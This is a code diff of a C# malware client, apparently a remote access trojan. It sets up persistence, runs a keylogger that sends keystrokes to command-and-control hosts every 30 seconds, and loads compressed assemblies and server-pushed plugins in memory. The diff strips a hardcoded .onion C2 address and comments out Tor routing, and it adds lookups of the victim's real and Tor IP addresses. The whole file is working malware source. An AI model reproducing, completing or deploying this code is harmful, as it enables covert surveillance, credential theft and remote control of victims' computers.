@@ -10,13 +10,14 @@ using System.IO.Compression;
 using System.Collections.Generic;
 using System.Net;
 using System.Threading.Tasks;
-using Bridge;
-using Starksoft.Aspen.Proxy;
+//using Starksoft.Aspen.Proxy;
+//using System.Net.Http;
+//using Bridge;
 //[assembly: System.Reflection.AssemblyVersion("1.0.0.1")]
 //[assembly: System.Reflection.AssemblyFileVersion("1.0.0.1")]
 //[assembly: System.Reflection.AssemblyTitle("%Client%")]
 //[assembly: System.Reflection. AssemblyDescription("%Description")]
-//[assembly: System.Runtime.Versioning.TargetFramework(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
+[assembly: System.Runtime.Versioning.TargetFramework(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
 [assembly: ComVisible(false)]
 //[assembly: System.Reflection.AssemblyProduct("%Product%")]
 //[assembly: System.Reflection.AssemblyCopyright("%Copyright%")]
@@ -28,10 +29,12 @@ namespace Client
     {
         public static List<string> hostLists = new List<string>() { "qsdqsdqsdkjsdljk.com:7521", "127.0.0.1:7788", "127.0.0.1:9988", "127.0.0.1:9875" };
         public static List<Host> hosts = new List<Host>();
-        public static string onionHost = "mjxtze3h3wy2exmlgzxzwhugwzn7l4hkkfazadvzadexi6mbj7w7wsqd.onion:8008";
-        public static List<string> onionHosts = new List<string>() { "mjxtze3h3wy2exmlgzxzwhugwzn7l4hkkfazadvzadexi6mbj7w7wsqd.onion:8008" };
+        public static string onionHost = "";
+        //public static List<string> onionHosts = new List<string>() { "" };
         public static bool torRoute = true;
-        public static string generalKey = "";
+        public static string realIp { get; set; }
+        public static string torIp { get; set; }
+        public static string generalKey = "123456789";
         public static bool offKeylog = false;
         public static string mutex = "%MUTEX%";
         public static Offline.Persistence.Method installationMethod = Offline.Persistence.Method.NONE;
@@ -56,235 +59,226 @@ namespace Client
 
             byte[] packetLib = new byte[] { };
 
+            /* TOR ROUTING
             byte[] bridge = new byte[] { };
-            byte[] net = new byte[] { };
+            //byte[] net = new byte[] { };
             byte[] aspen = new byte[] { };
-
-            if (e.Name.Contains("Net"))
-            {
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    using (MemoryStream compressedStream = new MemoryStream(net))
-                    {
-                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
-                        {
-                            deflater.CopyTo(ms);
-                        }
-                    }
-                    return System.Reflection.Assembly.Load(ms.ToArray());
-                }
-            }
+         
             if (e.Name.Contains("aspen"))
-            {
-                using (MemoryStream ms = new MemoryStream())
                 {
-                    using (MemoryStream compressedStream = new MemoryStream(aspen))
+                    using (MemoryStream ms = new MemoryStream())
                     {
-                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                        using (MemoryStream compressedStream = new MemoryStream(aspen))
                         {
-                            deflater.CopyTo(ms);
+                            using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                            {
+                                deflater.CopyTo(ms);
+                            }
                         }
+                        return System.Reflection.Assembly.Load(ms.ToArray());
                     }
-                    return System.Reflection.Assembly.Load(ms.ToArray());
                 }
-            }
-            if (e.Name.Contains("Bridge"))
-            {
-                using (MemoryStream ms = new MemoryStream())
+                if (e.Name.Contains("Bridge"))
                 {
-                    using (MemoryStream compressedStream = new MemoryStream(bridge))
+                    using (MemoryStream ms = new MemoryStream())
                     {
-                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                        using (MemoryStream compressedStream = new MemoryStream(bridge))
                         {
-                            deflater.CopyTo(ms);
+                            using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                            {
+                                deflater.CopyTo(ms);
+                            }
                         }
+                        return System.Reflection.Assembly.Load(ms.ToArray());
                     }
-                    return System.Reflection.Assembly.Load(ms.ToArray());
                 }
-            }
-            if (e.Name.Contains("Packet"))
-            {
-                using (MemoryStream ms = new MemoryStream())
+             ROUTING TOR */
+                if (e.Name.Contains("Packet"))
                 {
-                    using (MemoryStream compressedStream = new MemoryStream(packetLib))
+                    using (MemoryStream ms = new MemoryStream())
                     {
-                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                        using (MemoryStream compressedStream = new MemoryStream(packetLib))
                         {
-                            deflater.CopyTo(ms);
+                            using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                            {
+                                deflater.CopyTo(ms);
+                            }
                         }
+                        return System.Reflection.Assembly.Load(ms.ToArray());
                     }
-                    return System.Reflection.Assembly.Load(ms.ToArray());
                 }
-            }
-            if (e.Name.Contains("Off"))
-            {
-                using (MemoryStream ms = new MemoryStream())
+                if (e.Name.Contains("Off"))
                 {
-                    using (MemoryStream compressedStream = new MemoryStream(offline))
+                    using (MemoryStream ms = new MemoryStream())
                     {
-                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                        using (MemoryStream compressedStream = new MemoryStream(offline))
                         {
-                            deflater.CopyTo(ms);
+                            using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
+                            {
+                                deflater.CopyTo(ms);
+                            }
                         }
+                        return System.Reflection.Assembly.Load(ms.ToArray());
                     }
-                    return System.Reflection.Assembly.Load(ms.ToArray());
                 }
+                return null;
             }
-            return null;
-        }
 
-        static StarterClass()
-        {
-            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(DomCheck);
-        }
-
-        internal static void StartOfflineKeylogger()
-        {
-            if (Config.offKeylog)
+            static StarterClass()
             {
-                new Thread(() =>
+                AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(DomCheck);
+            }
+
+            internal static void StartOfflineKeylogger()
+            {
+                if (Config.offKeylog)
                 {
+                    new Thread(() =>
+                    {
+                        while (true)
+                        {
+                            Thread.Sleep(30000);
+                            if (clientHandler.Connected)
+                                Offline.Keyloggers.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID)); Offline.Keyloggers.Launch.ClearKeyStroke();
+                        }
+                    }).Start();
+
+                    Offline.Keyloggers.Launch.Start();
+                }
+            }
+
+            [DllImport("ntdll.dll")]
+            internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);
+
+            internal static ClientHandler clientHandler;
+
+            [MTAThread]
+            public static void Main()
+            {
+                MakeInstall();
+                OneInstance();
+
+                clientHandler = new ClientHandler();
+                StartOfflineKeylogger();
+
+                foreach (string h in Config.hostLists)
+                {
+                    string[] sp = h.Split(':');
+                    Config.hosts.Add(new Host(sp[0], sp[1]));
+                }
+
+                clientHandler.ConnectStart();
+
+                new Thread(new ThreadStart(() => {
                     while (true)
                     {
-                        Thread.Sleep(30000);
-                        if (clientHandler.Connected)
-                            Offline.Keyloggers.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID)); Offline.Keyloggers.Launch.ClearKeyStroke();
+                        Thread.Sleep(-1);
                     }
-                }).Start();
-
-                Offline.Keyloggers.Launch.Start();
+                })).Start();
             }
-        }
 
-        [DllImport("ntdll.dll")]
-        internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);
-
-        internal static ClientHandler clientHandler;
-
-        [MTAThread]
-        public static void Main()
-        {
-            MakeInstall();
-            OneInstance();
-
-            clientHandler = new ClientHandler();
-            StartOfflineKeylogger();
-
-            foreach (string h in Config.hostLists)
+            public static void MakeInstall()
             {
-                string[] sp = h.Split(':');
-                Config.hosts.Add(new Host(sp[0], sp[1]));
+                Offline.Persistence.Launch.Install(Config.installationMethod, Config.installationParam);
             }
 
-            clientHandler.ConnectStart();
+            internal static class PacketHandler
+            {
 
-            new Thread(new ThreadStart(() => {
-                while (true)
+                internal delegate void PluginDelegate(IPacket packet);
+                internal static PluginDelegate pluginDelegate;
+                static PacketHandler()
                 {
-                    Thread.Sleep(-1);
+                    pluginDelegate = new PluginDelegate(LoadPlugin);
                 }
-            })).Start();
-        }
 
-        public static void MakeInstall()
-        {
-            Offline.Persistence.Launch.Install(Config.installationMethod, Config.installationParam);
-        }
-
-        internal static class PacketHandler
-        {
-
-            internal delegate void PluginDelegate(IPacket packet);
-            internal static PluginDelegate pluginDelegate;
-            static PacketHandler()
-            {
-                pluginDelegate = new PluginDelegate(LoadPlugin);
-            }
-
-            internal static void ParsePacket(IPacket packet)
-            {
-                try
+                internal static void ParsePacket(IPacket packet)
                 {
-                    switch (packet.packetType)
+                    try
                     {
-                        case PacketType.CONNECTED:
-                            StarterClass.clientHandler.baseIp = packet.baseIp;
-                            break;
+                        switch (packet.packetType)
+                        {
+                            case PacketType.CONNECTED:
+                                StarterClass.clientHandler.baseIp = packet.baseIp;
+                                break;
 
-                        case (PacketType.CLOSE_CLIENT):
-                            StarterClass.NtTerminateProcess((IntPtr)(-1), 0);
-                            break;
+                            case (PacketType.CLOSE_CLIENT):
+                                StarterClass.NtTerminateProcess((IntPtr)(-1), 0);
+                                break;
 
-                        case (PacketType.UNINSTALL_CLOSE_CLIENT):
-                            Offline.Persistence.Launch.Uninstall(Config.installationMethod, Config.installationParam);
-                            break;
+                            case (PacketType.UNINSTALL_CLOSE_CLIENT):
+                                Offline.Persistence.Launch.Uninstall(Config.installationMethod, Config.installationParam);
+                                break;
 
-                        default:
-                            pluginDelegate.BeginInvoke(packet, new AsyncCallback(EndLoadPlugin), null);
-                            break;
+                            default:
+                                pluginDelegate.BeginInvoke(packet, new AsyncCallback(EndLoadPlugin), null);
+                                break;
 
+                        }
                     }
+                    catch { }
                 }
-                catch { }
-            }
 
-            internal static void LoadPlugin(IPacket packet)
-            {
-                System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(Compressor.QuickLZ.Decompress(packet.plugin));
-                System.Reflection.MethodInfo method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
-                object obj = assemblytoload.CreateInstance(method.Name);
-                LoadingAPI loadingAPI = new LoadingAPI
+                internal static void LoadPlugin(IPacket packet)
                 {
-                    host = StarterClass.clientHandler.host,
-                    baseIp = StarterClass.clientHandler.baseIp,
-                    HWID = StarterClass.clientHandler.HWID,
-                    key = Config.generalKey,
-                    currentPacket = packet,
-                };
+                    System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(Compressor.QuickLZ.Decompress(packet.plugin));
+                    System.Reflection.MethodInfo method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
+                    object obj = assemblytoload.CreateInstance(method.Name);
+                    LoadingAPI loadingAPI = new LoadingAPI
+                    {
+                        host = StarterClass.clientHandler.host,
+                        baseIp = StarterClass.clientHandler.baseIp,
+                        HWID = StarterClass.clientHandler.HWID,
+                        key = Config.generalKey,
+                        currentPacket = packet,
+                    };
 
-                method.Invoke(obj, new object[] { loadingAPI });
+                    method.Invoke(obj, new object[] { loadingAPI });
+                }
+
+                public static void EndLoadPlugin(IAsyncResult ar)
+                {
+                    pluginDelegate.EndInvoke(ar);
+                }
             }
+        }
+        internal class ClientHandler
+        {
+            internal Host host { get; set; }
+            internal string HWID { get; set; }
+            internal string baseIp { get; set; }
+            private Socket socket { get; set; }
+            internal bool Connected { get; set; }
+            internal int indexHost { get; set; }
 
-            public static void EndLoadPlugin(IAsyncResult ar)
+            private delegate byte[] ReadDataAsync();
+            private delegate IPacket ReadPacketAsync(byte[] bufferPacket);
+            private delegate bool ConnectAsync();
+            private delegate int SendDataAsync(IPacket data);
+
+
+            private ReadDataAsync readDataAsync;
+            private ReadPacketAsync readPacketAsync;
+            private ConnectAsync connectAsync;
+            private readonly SendDataAsync sendDataAsync;
+
+
+            internal ClientHandler() : base()
             {
-                pluginDelegate.EndInvoke(ar);
+                readDataAsync = new ReadDataAsync(ReceiveData);
+                readPacketAsync = new ReadPacketAsync(PacketParser);
+                sendDataAsync = new SendDataAsync(SendData);
             }
-        }
-    }
-    internal class ClientHandler
-    {
-        internal Host host { get; set; }
-        internal string HWID { get; set; }
-        internal string baseIp { get; set; }
-        private Socket socket { get; set; }
-        internal bool Connected { get; set; }
-        internal int indexHost { get; set; }
-
-        private delegate byte[] ReadDataAsync();
-        private delegate IPacket ReadPacketAsync(byte[] bufferPacket);
-        private delegate bool ConnectAsync();
-        private delegate int SendDataAsync(IPacket data);
-
-
-        private ReadDataAsync readDataAsync;
-        private ReadPacketAsync readPacketAsync;
-        private ConnectAsync connectAsync;
-        private readonly SendDataAsync sendDataAsync;
-
-
-        internal ClientHandler() : base()
-        {
-            readDataAsync = new ReadDataAsync(ReceiveData);
-            readPacketAsync = new ReadPacketAsync(PacketParser);
-            sendDataAsync = new SendDataAsync(SendData);
-        }
-        private static bool awake = false;
-        private async void StartProxy()
-        {
-            if (Router.StartProxy())
-                awake = true;
-        }
-        public void ConnectStart()
+            /* TOR ROUTING
+            internal static bool awake = false;
+            private async void StartProxy()
+            {
+                await Router.Proxify();
+                do { Thread.Sleep(2000); }
+                while (!Router.Alive);
+            }
+            ROUTING TOR */
+            public void ConnectStart()
         {
             
             if (indexHost == Config.hosts.Count)
@@ -294,17 +288,12 @@ namespace Client
             indexHost++;
 
             Thread.Sleep(125);
+           /* TOR ROUTING
             if (Config.torRoute)
-            {
-                StartProxy();
-                do { Thread.Sleep(1000); }
-                while (!awake);
+                connectAsync = new ConnectAsync(OnionCon);
+            else
+            ROUTING TOR */
                 connectAsync = new ConnectAsync(Connect);
-            }
-            else 
-            {
-                connectAsync = new ConnectAsync(Connect);
-            }
             connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
         }
 
@@ -312,28 +301,37 @@ namespace Client
         {
             try
             {
-                if (Config.torRoute)
-                {
-                    string[] _var = Config.onionHost.Split(':');
-                    int _tp = int.Parse(_var[1]);
-                    Socks5ProxyClient proxyClient = new Socks5ProxyClient("127.0.0.1", 39899, "", "");
-                    TcpClient client = proxyClient.CreateConnection(_var[0], 8008);
-                    socket = proxyClient.CreateConnection(_var[0], _tp).Client;
-
-                    Console.WriteLine("Connected");
-                  //  socket = OraclesBridge.ClientProxy.ConnectToSocks5Proxy("127.0.0.1", 39899, _var[0], (ushort)_tp, "", "");
-                }
-                else
-                {
-                    socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
-                    socket.Connect(host.host, host.port);
-                }
+                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
+                socket.Connect(host.host, host.port);                
                 return true;
             }
             catch { }
             return false;
         }
+
+        /* TOR ROUTING
+        private bool OnionCon()
+        {
+            try
+            {
+                if (!awake)
+                {
+                    StartProxy();
+                    do { Thread.Sleep(1000); }
+                    while (!awake);
+                }
+                string[] _var = Config.onionHost.Split(':');
+                int _tp = int.Parse(_var[1]);
+                Socks5ProxyClient proxyClient = new Socks5ProxyClient("127.0.0.1", 39899, "", "");
+                TcpClient client = proxyClient.CreateConnection(_var[0], 8008);
+                socket = proxyClient.CreateConnection(_var[0], _tp).Client;
+                return true;
+            }
+            catch { }
+            return false;
+        }
+        ROUTING TOR */
 
         public void EndConnect(IAsyncResult ar)
         {
@@ -479,54 +477,78 @@ namespace Client
             }
         }
     }
+    /* TOR ROUTING
     internal class Router
     {
-        internal static TorSharpProxy proxy;
-        internal static bool Alive = false;
 
-        internal static bool StartProxy()
+        // Internals
+        #region Internals
+        internal async static Task StartProxy()
         {
-            Proxify();
+            await Proxify();
             do { Thread.Sleep(2000); }
             while (!Alive);
-            return Alive;
+            ClientHandler.awake = Alive;
         }
-        private static async Task Proxify()
+
+        internal static async Task<bool> IdentityChange()
+        {
+            await proxy.GetNewIdentityAsync();
+            var handler = new HttpClientHandler
+            {
+                Proxy = new WebProxy(new Uri("http://localhost:" + settings.PrivoxySettings.Port))
+            };
+            try { Config.torIp = await new HttpClient(handler).GetStringAsync("http://api.ipify.org"); return true; } 
+            catch { Config.torIp = "127.0.0.1"; return false; }
+        }
+
+        internal static void KillProxy()
+        {
+            proxy.Stop();
+        }
+        #endregion Internals
+
+        // Privates
+        #region Private
+        private static TorSharpProxy proxy;
+        internal static bool Alive = false;
+        private static TorSharpSettings settings { get; set; }
+
+        internal static async Task Proxify()
         {
             //string _ = $"{port} 127.0.0.1:{port}";
-            var settings = new TorSharpSettings
+            settings = new TorSharpSettings
             {
                 ZippedToolsDirectory = Path.Combine(Path.GetTempPath(), "_\\TorZipped"),
                 ExtractedToolsDirectory = Path.Combine(Path.GetTempPath(), "_\\TorExtracted"),
                 PrivoxySettings = { Port = 22700 },
                 TorSettings =
-            {
-                SpinUpServer = false,
-                HiddenServiceDir = "HiddenService",
-                HiddenServicePort = "",
-                SocksPort = 39899,
-                ControlPort = 33790,
-                // ORPort = "9003",
-                ControlPassword = "foobar",
-            },
+                {
+                    SpinUpServer = false,
+                    HiddenServiceDir = "HiddenService",
+                    HiddenServicePort = "",
+                    SocksPort = 39899,
+                    ControlPort = 33790,
+                    // ORPort = "9003",
+                    ControlPassword = "foobar",
+                },
             };
             // download tools
-         //   await new TorSharpToolFetcher(settings, new HttpClient()).FetchAsync();
+            await new TorSharpToolFetcher(settings, new HttpClient()).FetchAsync();
 
             // execute
             proxy = new TorSharpProxy(settings);
 
-         //   var handler = new HttpClientHandler
-         //   {
-        //        Proxy = new WebProxy(new Uri("http://localhost:" + settings.PrivoxySettings.Port))
-         //   };
-            await proxy.ConfigureAndStartAsync();
-            // Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
-            // await proxy.GetNewIdentityAsync();
-            //Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
+            var handler = new HttpClientHandler
+            {
+                Proxy = new WebProxy(new Uri("http://localhost:" + settings.PrivoxySettings.Port))
+            };
+            await proxy.SpinUpAsync();
+            try { Config.realIp = await new HttpClient().GetStringAsync("http://api.ipify.org"); } catch { Config.realIp = "127.0.0.1"; }
+            try { Config.torIp = await new HttpClient(handler).GetStringAsync("http://api.ipify.org"); } catch { Config.torIp = "127.0.0.1"; }
             Alive = true;
-            // proxy.Stop();
-            
         }
+        #endregion Private
     }
+    ROUTING TOR */
 }
